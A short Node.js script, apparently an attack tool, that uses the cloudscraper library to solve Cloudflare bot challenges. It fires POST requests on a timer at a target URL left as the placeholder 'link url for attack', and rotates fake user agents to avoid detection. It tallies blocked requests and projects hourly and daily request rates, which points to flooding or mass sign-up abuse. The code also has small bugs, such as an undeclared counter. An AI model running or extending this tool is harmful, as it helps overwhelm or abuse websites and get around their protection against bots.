const cloudscraper = require('cloudscraper'),
    path = require('path'),
    random_useragent = require('random-useragent'),
    fakeUseragent = require('fake-useragent');

if (process.argv.length !== 4) {
    console.log(`
Usage: node ${path.basename(__filename)} [delay] [slient on/off]
Usage: node ${path.basename(__filename)} 1 off`);
    process.exit(0);
}
const time = process.argv[2]
const slient = process.argv[3];

var tensec = 0
var blocked = 0
var perhrrate = 0
var perdayrate = 0

function send_req_raw(useragent) {
    var options = {
        uri: 'link url for attack',
        resolveWithFullResponse: true,
        challengesToSolve: 10,
        headers: { 'User-Agent': fakeUseragent() }
    };
    cloudscraper.post(options).then(function (response) {
        if (slient.toLowerCase() == "off") {
            console.log(err.statusCode);
        }
        registered += 1;
        tensec += 1;
    }).catch(function (err) {
        if (slient.toLowerCase() == "off") {
            console.log(err.statusCode);
        }
        if (err.statusCode == 403) {
            blocked += 1;
        }
    });
}

function run() {
    var useragent = random_useragent.getRandom()
    send_req_raw(useragent);
}

setInterval(() => {
    run();
    
}, time);
 
setInterval(() => {
    perhrrate = (tensec*6)*60
    perdayrate = ((tensec*6)*60)*24
    tensec = 0;
}, 10000);
process.on('uncaughtException', function (err) {
    console.log(err);
});
process.on('unhandledRejection', function (err) {
    console.log(err);
});
